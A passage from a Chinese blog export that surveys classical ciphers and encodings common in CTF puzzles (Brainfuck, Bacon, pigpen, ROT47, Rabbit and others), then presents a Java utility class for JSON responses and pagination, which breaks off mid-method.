class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt; +++[</span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">-</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"> &gt;</span></span></span>---<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt; ]&gt;</span></span></span>--- .---- .<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">+++</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"> ++++[ </span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">-</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span>--- ----<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span></span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-tag">]&gt;</span>--- ----- ----- .<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">+++</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"> ++++[ </span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">-</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span>+++ ++++<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt; ]&gt;</span></span></span>+++ ++.<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">+</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"> +++++ +[</span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">-</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span>- -----</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="4"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">-<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span>. <span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">++++</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"> ++++[ </span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">-</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span>+++ +++++ <span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span>++ .<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">+++</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"> [</span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">-</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span>-- -<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span>- ----. <span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">++++</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"> +++[</span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">-</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"></span></span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="5"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">&gt;---- ---<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"> &gt;</span></span></span>---- ----. +++++ +..++ +++.+ .<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">+++</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"> [</span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">-</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span>-- -<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span>- --.<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">+</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag"> +++++</span></span></span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="6"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-tag">+[</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">-</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span>+ +++++ +<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span>+ ++.++ +.+++ +++++ +.--- -.+++ ++.<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">+</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"> ++[</span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">-</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span> +++<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"> &gt;</span></span></span>++++</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="7"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">++.<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span></span></div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>这个为brainfuck，在线解码网站解码即可。<p><span style="color:#333333;">附上链接：<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="nofollow noopener">Brainfuck/Ook!在线编码解码</a></span><span style="color:rgb(51,51,51);font-family:Lato, sans-serif;"><span style="font-size:14px;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="color:#CC33CC;"><br></span></span></span></span></span></span></p><p><span style="color:rgb(51,51,51);font-family:Lato, sans-serif;"><span style="font-size:14px;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="color:#CC33CC;"><span style="color:#333333;">&nbsp;还有许多类型的编码，请参照：<a href="http://blog.csdn.net/pdsu161530247/article/details/74640746" target="_blank" rel="noopener">一段base64的解体过程</a></span><br></span></span></span></span></span></span></p><p><span style="color:rgb(51,51,51);font-family:Lato, sans-serif;"><span style="font-size:14px;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="color:#CC33CC;"><br></span></span></span></span></span></span></p><h4>7.当铺密码</h4></div><p>&nbsp; &nbsp; &nbsp;当铺密码就是一种将中文和<a href="https://www.33iq.com/index/link?url=https://wapbaike.baidu.com/item/%E6%95%B0%E5%AD%97/6204" target="_blank" rel="nofollow noopener">数字</a>进行转化的<a href="https://www.33iq.com/index/link?url=https://wapbaike.baidu.com/item/%E5%AF%86%E7%A0%81/65553" target="_blank" rel="nofollow noopener">密码</a>，<a href="https://www.33iq.com/index/link?url=https://wapbaike.baidu.com/item/%E7%AE%97%E6%B3%95" target="_blank" rel="nofollow noopener">算法</a>相当简单:当前汉字有多少笔画出头，就是转化成数字几。例如：</p><h4 class="topic-context"></h4><p dir="ltr">王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125&nbsp; 丰富一下知识面2333.。。</p><h4>8.培根密码</h4><p>&nbsp; &nbsp; &nbsp;培根密码中的ab,代表的是数学二进制中的0和1.通过下列的密码表进行加密和解密：<br>第一种方式：<br>A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab<br>K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb<br>U babaa V babab W babba X babbb Y bbaaa Z bbaab<br>第二种方式<br>a AAAAA g AABBA n ABBAA t BAABA<br>b AAAAB h AABBB o ABBAB u-v BAABB<br>c AAABA i-j ABAAA p ABBBA w BABAA<br>d AAABB k ABAAB q ABBBB x BABAB<br>e AABAA l ABABA r BAAAA y BABBA<br></p><p>f AABAB m ABABB s BAAAB z BABBB</p><p>感兴趣的可以参考大牛的文章：<a href="http://www.360doc.com/content/15/0222/14/21874787_450056531.shtml" target="_blank" rel="nofollow noopener">培根密码</a></p><h4>9.猪圈密码</h4><p>&nbsp; &nbsp; &nbsp;&nbsp;<strong>猪圈密码</strong>(亦称<strong>朱高密码</strong>、<strong>共济会密码</strong>或<strong>共济会员密码</strong>)，是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响<a href="https://baike.so.com/doc/6264154-6477575.html" target="_blank" rel="nofollow noopener">密码分析</a>，亦可用在其它替代式的方法。</p><p></p><div><span style="font-family:'微软雅黑', 'Times New Roman', Times, serif;"><span style="font-size:14px;"><a href="https://en.wikipedia.org/wiki/Pigpen_cipher" target="_blank" rel="nofollow noopener"></a>明文字母和对应密文：<br></span></span></div><div><span style="font-family:'微软雅黑', 'Times New Roman', Times, serif;"><span style="font-size:14px;"><img alt="" src="https://img-blog.csdn.net/20170722102101792?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcGRzdTE2MTUzMDI0Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" srcset="/img/loading.gif"><br></span></span></div><div><span style="font-family:'微软雅黑', 'Times New Roman', Times, serif;"><span style="font-size:14px;">明文：THE QUICK BROWN FPX JUMPS OVER THE LAZY DOG</span></span></div><div><span style="font-family:'微软雅黑', 'Times New Roman', Times, serif;font-size:14px;">密文：</span></div><div><span style="font-family:'微软雅黑', 'Times New Roman', Times, serif;font-size:14px;"><img alt="" src="https://img-blog.csdn.net/20170722100908723?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcGRzdTE2MTUzMDI0Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" srcset="/img/loading.gif"></span></div><p>&nbsp;</p><h4>10.unicode编码</h4><p>例如：<span style="font-size:14px;">原文本：You had me at hello</span></p><div><span style="font-size:14px;">编码后\u0059\u006f\u0075\u0020\u0068\u0061\u0064\u0020\u006d\u0065\u0020\u0061\u0074\u0020\u0068\u0065\u006c\u006c\u006f</span></div><p></p><div><br></div><h5>11.URL编码</h5><p>&nbsp; &nbsp;<span style="font-family:'微软雅黑', 'Times New Roman', Times, serif;">url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js：有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。</span></p><h5><span style="font-family:'微软雅黑', 'Times New Roman', Times, serif;">12.ROT5/13/18/47编码</span></h5><p>&nbsp; &nbsp;&nbsp;</p><p><u>ROT5、ROT13、ROT18、ROT47</u> 编码是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取，而不让其理解其意。</p><p>ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：<br><strong>ROT5</strong>：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。<br><strong>ROT13</strong>：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。<br><strong>ROT18</strong>：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。<br></p><p><strong>ROT47</strong>：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126</p><p><strong>例：Good Day经过ROT47加密后为v@@5 s2JP&nbsp;<a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="nofollow noopener">ROT5/13/18/47在线加解密</a></strong></p><h5>13.Rabbit加密</h5><p><span style="font-size:14px;">&nbsp; &nbsp; &nbsp; 就给出几个例子参考下好了。。。</span></p><p><span style="font-size:14px;">明文I Love You小可爱无密匙加密后密文为U2FsdGVkX1/ouFei55jKdzY1fWNS4jxHVNf/AfKWjnBrOGY=</span></p><p><span style="font-size:14px;">明文I Love You 521无密匙加密后密文为U2FsdGVkX19DvuEo5PvBA8TuLrM2t+EZBvUkzlAa</span></p><p><span style="font-size:14px;">明文I Love You 521密匙为666加密后密文为U2FsdGVkX18w6vxXxux/ivRVwo3xMzTxmUyk7cHz</span></p><p><span style="font-size:14px;"><a href="http://www.sojson.com/encrypt_rabbit.html" target="_blank" rel="nofollow noopener">Rabbit在线加解密</a></span></p><h5>14.跳舞的小人</h5><p>&nbsp; &nbsp; &nbsp;来自夏洛克福尔摩斯在《归来记》中侦探案件使用的一种加密方式。</p><p><img alt="" src="https://img-blog.csdn.net/20180309143806697" srcset="/img/loading.gif"><br></p><p>&nbsp; &nbsp; &nbsp;对应的明文是</p><div class="hljs code-wrapper"><pre class="replay-info-txt answer_con" name="code">AT ELRIGES （住在埃尔里奇） 　　COME ELSIE （来吧 埃尔茜） 　　NEVER （决不） 　　ELSIE PREPARE TO MEET THY GOD （埃尔茜 准备见上帝吧） </pre></div><p></p><h4>&nbsp;15.QWE加密</h4><div>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; 从电脑键盘上的字母从Q开始数，顺序是Q W E R T Y U I。。。对应的字母顺序依次是A B C D E F G H 也就是说Q=A,W=B,E=C，依次类推。</div><p>&nbsp; &nbsp; &nbsp; &nbsp; </p><p></p><p></p><p></p>                                    </div>
                                                <div class="more-toolbox">
                <div class="left-toolbox">
                    <ul class="toolbox-list">]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>转载</tag>
        <tag>渗透学习</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonUtil-常用的json工具类</title>
    <url>/article/81637288.html</url>
    <content><![CDATA[<font size="4" face="FangSong_GB2312">
这里介绍一下常用的json工具类，在我们后端开发的时候直接拿来用就可以了，会便捷很多。

<h3 id="successJson"><a href="#successJson" class="headerlink" title="successJson"></a>successJson</h3><p>首先是正常返回时，我们返回成功的JSON</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**<br>     * 返回一个info为空对象的成功消息的json<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">successJson</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> successJson(<span class="hljs-keyword">new</span> JSONObject());<br>    &#125;<br><br>    <span class="hljs-comment">/**<br>     * 返回一个返回码为100的json<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">successJson</span><span class="hljs-params">(Object info)</span> </span>&#123;<br>        JSONObject resultJson = <span class="hljs-keyword">new</span> JSONObject();<br>        resultJson.put(<span class="hljs-string">"code"</span>, Constants.SUCCESS_CODE);<br>        resultJson.put(<span class="hljs-string">"msg"</span>, Constants.SUCCESS_MSG);<br>        resultJson.put(<span class="hljs-string">"info"</span>, info);<br>        <span class="hljs-keyword">return</span> resultJson;<br>    &#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="errorJson"><a href="#errorJson" class="headerlink" title="errorJson"></a>errorJson</h3><p>当非正常返回时，例如报错,则返回错误信息JSON</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**<br>     * 返回错误信息JSON<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">errorJson</span><span class="hljs-params">(ErrorEnum errorEnum)</span> </span>&#123;<br>        JSONObject resultJson = <span class="hljs-keyword">new</span> JSONObject();<br>        resultJson.put(<span class="hljs-string">"code"</span>, errorEnum.getErrorCode());<br>        resultJson.put(<span class="hljs-string">"msg"</span>, errorEnum.getErrorMsg());<br>        resultJson.put(<span class="hljs-string">"info"</span>, <span class="hljs-keyword">new</span> JSONObject());<br>        <span class="hljs-keyword">return</span> resultJson;<br>    &#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="查询分页"><a href="#查询分页" class="headerlink" title="查询分页"></a>查询分页</h3><p>前端实现数据展示时，可能有上万行数据，所以查询分页是很有必要的。</p>
<h4 id="默认展示行数"><a href="#默认展示行数" class="headerlink" title="默认展示行数"></a>默认展示行数</h4><p>分页查询之前的处理参数,没有传pageRow参数时,默认每页10条:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">fillPageParam</span><span class="hljs-params">(<span class="hljs-keyword">final</span> JSONObject paramObject)</span> </span>&#123;<br>    fillPageParam(paramObject, <span class="hljs-number">10</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h4 id="添加查询条件"><a href="#添加查询条件" class="headerlink" title="添加查询条件"></a>添加查询条件</h4><p>在分页查询之前,为查询条件里加上分页参数,<br>pageRow是每页需要显示的结果数量（这里是10），pageNum是根据当前页的索引（从1开始），offSet就是第1,2…n行的第一个数据的索引</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**<br>     * <span class="hljs-doctag">@param</span> paramObject    查询条件json<br>     * <span class="hljs-doctag">@param</span> defaultPageRow 默认的每页条数,即前端不传pageRow参数时的每页条数<br>     * 每页需要显示的结果数量pageRow（这里是10），然后根据当前页的索引pageNum（从1开始）<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">fillPageParam</span><span class="hljs-params">(<span class="hljs-keyword">final</span> JSONObject paramObject, <span class="hljs-keyword">int</span> defaultPageRow)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> pageNum = paramObject.getIntValue(<span class="hljs-string">"pageNum"</span>);<br>        pageNum = pageNum == <span class="hljs-number">0</span> ? <span class="hljs-number">1</span> : pageNum;<br>        <span class="hljs-keyword">int</span> pageRow = paramObject.getIntValue(<span class="hljs-string">"pageRow"</span>);<br>        pageRow = pageRow == <span class="hljs-number">0</span> ? defaultPageRow : pageRow;<br>        <span class="hljs-comment">// offset ==&gt; SQL中OFFSET条件，作用：假设展示第n页数据，offSet就是第n行的第一个数据的索引</span><br>        paramObject.put(<span class="hljs-string">"offSet"</span>, (pageNum - <span class="hljs-number">1</span>) * pageRow);<br>        paramObject.put(<span class="hljs-string">"pageRow"</span>, pageRow);<br>        paramObject.put(<span class="hljs-string">"pageNum"</span>, pageNum);<br>        <span class="hljs-comment">//删除此参数,防止前端传了这个参数,pageHelper分页插件检测到之后,拦截导致SQL错误</span><br>        paramObject.remove(<span class="hljs-string">"pageSize"</span>);<br>    &#125;<br></code></pre></div></td></tr></table></figure>

<p>如果对SQL的分页查询有疑惑，可以去仔细看看↓</p>
<p><a href="https://www.liaoxuefeng.com/wiki/1177760294764384/1217864791925600" target="_blank" rel="noopener" class="LinkCard">分页查询-廖雪峰的官方网站</a></p>
<h4 id="分页查询结果封装"><a href="#分页查询结果封装" class="headerlink" title="分页查询结果封装"></a>分页查询结果封装</h4><p>这里就是将分页后的数据(包括查询到的数据list和分页后的页数和结果数量以及总页数)整合成JSON，然后返回，又前端来呈现。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**<br>     * 查询分页结果后的封装工具方法<br>     *<br>     * <span class="hljs-doctag">@param</span> requestJson 请求参数json,此json在之前调用fillPageParam 方法时,已经将pageRow放入<br>     * <span class="hljs-doctag">@param</span> list        查询分页对象list<br>     * <span class="hljs-doctag">@param</span> totalCount  查询出记录的总条数<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">successPage</span><span class="hljs-params">(<span class="hljs-keyword">final</span> JSONObject requestJson, List&lt;JSONObject&gt; list, <span class="hljs-keyword">int</span> totalCount)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> pageRow = requestJson.getIntValue(<span class="hljs-string">"pageRow"</span>);<br>        <span class="hljs-keyword">int</span> totalPage = getPageCounts(pageRow, totalCount);<br>        JSONObject result = successJson();<br>        JSONObject info = <span class="hljs-keyword">new</span> JSONObject();<br>        info.put(<span class="hljs-string">"list"</span>, list);<br>        info.put(<span class="hljs-string">"totalCount"</span>, totalCount);<br>        info.put(<span class="hljs-string">"totalPage"</span>, totalPage);<br>        result.put(<span class="hljs-string">"info"</span>, info);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">/**<br>     * 获取总页数<br>     *<br>     * <span class="hljs-doctag">@param</span> pageRow   每页行数<br>     * <span class="hljs-doctag">@param</span> itemCount 结果的总条数<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getPageCounts</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pageRow, <span class="hljs-keyword">int</span> itemCount)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (itemCount == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> itemCount % pageRow &gt; <span class="hljs-number">0</span> ?<br>                itemCount / pageRow + <span class="hljs-number">1</span> :<br>                itemCount / pageRow;<br>    &#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="页面数据刷新"><a href="#页面数据刷新" class="headerlink" title="页面数据刷新"></a>页面数据刷新</h3><p>在添加/修改用户的时候会用到此方法来刷新页面</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**<br>     * 查询分页结果后的封装工具方法<br>     *<br>     * <span class="hljs-doctag">@param</span> list 查询分页对象list<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">successPage</span><span class="hljs-params">(List&lt;JSONObject&gt; list)</span> </span>&#123;<br>        JSONObject result = successJson();<br>        JSONObject info = <span class="hljs-keyword">new</span> JSONObject();<br>        info.put(<span class="hljs-string">"list"</span>, list);<br>        result.put(<span class="hljs-string">"info"</span>, info);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="request-gt-json"><a href="#request-gt-json" class="headerlink" title="request ==&gt; json"></a>request ==&gt; json</h3><p>将request参数值转为json,直接调用</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">方法一<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">request2Json</span><span class="hljs-params">(HttpServletRequest request)</span> </span>&#123;<br>        JSONObject requestJson = <span class="hljs-keyword">new</span> JSONObject();<br>        Enumeration paramNames = request.getParameterNames();<br>        <span class="hljs-keyword">while</span> (paramNames.hasMoreElements()) &#123;<br>            String paramName = 